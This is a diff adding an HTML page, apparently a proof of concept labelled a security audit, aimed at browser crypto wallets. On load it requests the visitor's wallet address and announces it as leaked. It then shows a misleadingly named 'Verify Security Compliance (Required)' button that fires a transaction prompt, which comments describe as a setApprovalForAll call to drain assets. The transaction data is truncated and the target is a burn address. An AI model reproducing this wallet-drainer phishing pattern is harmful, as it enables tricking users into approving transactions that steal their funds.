@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Security Audit: Identity Theft Proof</title>
+    <style>
+        body { font-family: monospace; background: #000; color: #fff; padding: 20px; }
+        .success { color: #0f0; }
+        .data { color: #ff0; }
+        .danger { color: #f00; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h2>Critical Security Audit: Automated Identity & Transaction Leakage</h2>
+    <div id="status">Scanning...</div>
+    <div id="actionArea"></div>
+
+    <script>
+        async function runAbsoluteProof() {
+            const status = document.getElementById('status');
+            const bridge = window.ethereum;
+
+            if (!bridge) {
+                status.innerHTML = "[-] Bridge not found.";
+                return;
+            }
+
+            try {
+                // Tahap 1: Mendapatkan alamat secara otomatis
+                const accounts = await bridge.request({ method: 'eth_requestAccounts' });
+                
+                status.innerHTML = `<span class="success">[!] IDENTITY LEAKED!</span><br>
+                                    <span class="data">Target Address: ${accounts[0]}</span>`;
+                
+                // Tahap 2: Simulasi memicu interaksi transaksi berbahaya
+                document.getElementById('actionArea').innerHTML = `
+                    <br><p class="danger">[!] Triggering malicious transaction prompt...</p>
+                    <button onclick="triggerExploit('${accounts[0]}')">Verify Security Compliance (Required)</button>
+                `;
+            } catch (err) {
+                status.innerHTML = `[!] Bridge access denied: ${err.message}`;
+            }
+        }
+
+        async function triggerExploit(address) {
+            try {
+                // Simulasi serangan nyata: memicu transaksi 'setApprovalForAll' 
+                // untuk menguras aset pengguna
+                await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: address,
+                        to: '0x000000000000000000000000000000000000dead', // Alamat penyerang
+                        data: '0xa22cb465...', // Contoh fungsi 'setApprovalForAll'
+                        value: '0x0',
+                    }],
+                });
+            } catch (err) {
+                alert("[!] Malicious Transaction Prompt Triggered Successfully via Leak.");
+            }
+        }
+
+        window.onload = runAbsoluteProof;
+    </script>
+</body>
+</html>
